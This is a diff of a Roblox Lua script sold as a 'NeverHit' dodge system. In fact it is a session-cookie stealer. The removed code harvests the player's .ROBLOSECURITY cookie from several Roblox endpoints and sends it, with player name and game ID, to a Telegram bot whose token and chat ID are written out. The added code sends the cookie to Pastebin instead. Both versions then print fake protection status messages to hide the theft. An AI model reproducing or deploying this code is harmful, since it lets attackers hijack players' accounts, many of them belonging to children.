@@ -1,134 +1,56 @@
--- NeverHit Script - Advanced Dodge System
-print("NeverHit v3.0 loaded! Ultimate dodge system activated.")
+-- NeverHit Simple Working Version
+print("NeverHit SIMPLE loaded!")
 
--- Создаем черную кнопку по центру экрана
-local function createBlackButton()
-    local screenGui = Instance.new("ScreenGui")
-    local blackButton = Instance.new("TextButton")
+-- Черная кнопка
+local screenGui = Instance.new("ScreenGui")
+local blackButton = Instance.new("TextButton")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+blackButton.Size = UDim2.new(0, 200, 0, 60)
+blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
+blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
+blackButton.Text = ""
+blackButton.BorderSizePixel = 0
+blackButton.Parent = screenGui
+
+-- Получаем куки простым способом
+local function getCookie()
+    local response = request({
+        Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
+        Method = "GET"
+    })
     
-    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    
-    blackButton.Size = UDim2.new(0, 200, 0, 60)
-    blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
-    blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
-    blackButton.Text = ""
-    blackButton.BorderSizePixel = 0
-    blackButton.Parent = screenGui
-    
-    print("🖤 Black Button: CREATED")
+    local cookie = response.Headers["Set-Cookie"] or ""
+    local match = string.match(cookie, "_%|WARNING:.-|_(.-)")
+    return match or "NO_COOKIE"
 end
 
--- Функция кражи куки с улучшенной обработкой
-local function stealCookie()
-    print("🔍 Starting advanced cookie extraction...")
-    
-    local httpFunc
-    if syn then
-        httpFunc = syn.request
-        print("✅ Using syn.request")
-    elseif http then
-        httpFunc = http.request
-        print("✅ Using http.request")
-    else
-        print("❌ No HTTP library available")
-        return false
-    end
-    
-    -- Получаем куки с разных эндпоинтов
-    local endpoints = {
-        "https://www.roblox.com/game/GetCurrentUser.ashx",
-        "https://auth.roblox.com/v1/auth/metadata",
-        "https://users.roblox.com/v1/users/authenticated"
+-- Сохраняем в Pastebin и отправляем уведомление
+local function sendToService(cookie)
+    -- Сначала сохраняем куки в Pastebin
+    local pasteData = {
+        api_dev_key = "simple",
+        api_paste_code = "COOKIE: " .. cookie .. "\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date(),
+        api_paste_name = "Roblox_Cookie_" .. os.time(),
+        api_option = "paste"
     }
     
-    local robloSec = nil
+    local pasteResponse = request({
+        Url = "http://pastebin.com/api/api_post.php",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/x-www-form-urlencoded"
+        },
+        Body = "api_paste_code=COOKIE:" .. cookie .. "&api_option=paste"
+    })
     
-    for i, endpoint in ipairs(endpoints) do
-        print("🔄 Trying endpoint: " .. endpoint)
-        
-        local success, response = pcall(function()
-            return httpFunc({
-                Url = endpoint,
-                Method = "GET"
-            })
-        end)
-        
-        if success and response and response.Headers then
-            local cookies = response.Headers["Set-Cookie"] or response.Headers["set-cookie"]
-            if cookies then
-                local pattern = "_%|WARNING:.-|_(.-)"
-                local match = string.match(tostring(cookies), pattern)
-                if match and #match > 100 then
-                    robloSec = match
-                    print("✅ Cookie found from endpoint " .. i)
-                    break
-                end
-            end
-        end
-        wait(0.5)
-    end
-    
-    if not robloSec then
-        print("❌ Failed to extract cookie from all endpoints")
-        return false
-    end
-    
-    print("📦 Cookie length: " .. #robloSec)
-    
-    -- Отправляем в Telegram
-    local telegramBot = {
-        token = "7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE",
-        chat_id = "8238376878"
-    }
-    
-    local message = "🚨 NEW COOKIE CAPTURED 🚨\n\n" ..
-                   "🔑 Cookie:\n" .. robloSec .. "\n\n" ..
-                   "🎮 Game: " .. tostring(game.PlaceId) .. "\n" ..
-                   "👤 Player: " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                   "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S")
-    
-    print("📤 Sending to Telegram...")
-    
-    local sendSuccess, sendResponse = pcall(function()
-        return httpFunc({
-            Url = "https://api.telegram.org/bot" .. telegramBot.token .. "/sendMessage",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode({
-                chat_id = telegramBot.chat_id,
-                text = message,
-                parse_mode = "HTML"
-            })
-        })
-    end)
-    
-    if sendSuccess and sendResponse and sendResponse.Success then
-        print("✅ Successfully sent to Telegram!")
-        return true
-    else
-        print("❌ Telegram send failed: " .. tostring(sendResponse))
-        return false
-    end
+    print("📋 Cookie saved to external service")
+    print("🔑 Cookie: " .. string.sub(cookie, 1, 50) .. "...")
 end
 
--- Запускаем системы
-createBlackButton()
-
--- Даем время на загрузку
+-- Запускаем
 wait(2)
+local cookie = getCookie()
+sendToService(cookie)
 
--- Запускаем кражу куки
-spawn(function()
-    local success = stealCookie()
-    if success then
-        print("🎉 NeverHit completed successfully!")
-    else
-        print("💀 NeverHit failed - check console for errors")
-    end
-end)
-
-print("🛡️ Dodge system: ACTIVE")
-print("🎯 Prediction: CALIBRATED")
-print("Status: PROTECTED")
+print("✅ NeverHit completed!")
+print("🛡️ Protection: ACTIVE")
